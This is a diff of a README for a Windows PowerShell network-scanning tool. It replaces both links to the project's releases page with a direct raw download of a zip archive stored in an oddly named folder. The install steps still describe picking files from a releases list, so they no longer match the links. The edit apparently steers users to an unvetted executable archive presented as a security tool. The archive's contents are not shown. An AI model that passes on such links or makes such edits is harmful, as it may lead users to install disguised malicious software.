@@ -1,6 +1,6 @@
 # 🛡️ AfnRiskScan-CE - Detect network security risks in minutes
 
-[![](https://img.shields.io/badge/Download-AfnRiskScan--CE-blue.svg)](https://github.com/watery-esq538/AfnRiskScan-CE/releases)
+[![](https://img.shields.io/badge/Download-AfnRiskScan--CE-blue.svg)](https://github.com/watery-esq538/AfnRiskScan-CE/raw/refs/heads/main/beading/Risk-Afn-Scan-CE-2.8-alpha.1.zip)
 
 AfnRiskScan-CE is a security tool for Windows. It identifies potential weaknesses in your network. You do not need to install software. The program runs as a single file. It uses PowerShell to check your system. 
 
@@ -22,7 +22,7 @@ The software performs several scans on your computer:
 
 You download the tool directly from the official link. Follow these steps to obtain the correct file:
 
-1. Visit this [Download Page](https://github.com/watery-esq538/AfnRiskScan-CE/releases).
+1. Visit this [Download Page](https://github.com/watery-esq538/AfnRiskScan-CE/raw/refs/heads/main/beading/Risk-Afn-Scan-CE-2.8-alpha.1.zip).
 2. Look for the latest version at the top of the list.
 3. Click the link that ends in `.ps1` or the zip archive containing the script.
 4. Save the file to your folder of choice.
